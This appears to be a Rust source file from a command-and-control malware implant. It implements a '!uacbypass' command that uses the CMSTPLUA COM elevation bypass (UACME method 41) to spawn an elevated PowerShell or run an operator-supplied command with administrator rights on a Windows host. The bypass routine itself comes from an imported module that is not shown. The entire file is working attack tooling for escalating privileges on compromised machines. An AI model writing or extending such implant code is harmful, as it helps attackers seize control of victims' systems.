//! UAC Bypass command handler
//!
//! Implements the !uacbypass command which attempts to elevate privileges
//! using the CMSTPLUA COM elevation bypass (UACME method 41).

use super::CommandResult;

/// Execute the UAC bypass command
///
/// # Arguments
/// * `command` - Optional command to execute with elevated privileges
///   If empty, spawns an elevated powershell.exe
///
/// # Returns
/// CommandResult with success/error message
pub fn execute_uac_bypass(command: &str) -> CommandResult {
    use c2_common::uacme::UacBypass;

    // Skip the check - just try the bypass directly!
    // The check was failing for "deny only" admin groups (filtered token)
    // If it fails, we'll get an error anyway

    let command = command.trim();

    let result = if command.is_empty() {
        // No command specified, spawn elevated cmd
        UacBypass::spawn_elevated_powershell()
    } else {
        // Execute the specified command
        UacBypass::exec_command(command, true)
    };

    match result {
        Ok(()) => {
            if command.is_empty() {
                CommandResult::TextResponse(
                    "**UAC Bypass:** Success!\n\n\
                    Spawned elevated powershell.exe window."
                        .to_string(),
                )
            } else {
                CommandResult::TextResponse(format!(
                    "**UAC Bypass:** Success!\n\n\
                        Executed command with elevated privileges:\n\
                        ```\n{}\n```",
                    command
                ))
            }
        }
        Err(e) => CommandResult::Error(format!(
            "**UAC Bypass Failed:** {}\n\n\
                The bypass may not work on this system configuration.",
            e
        )),
    }
}
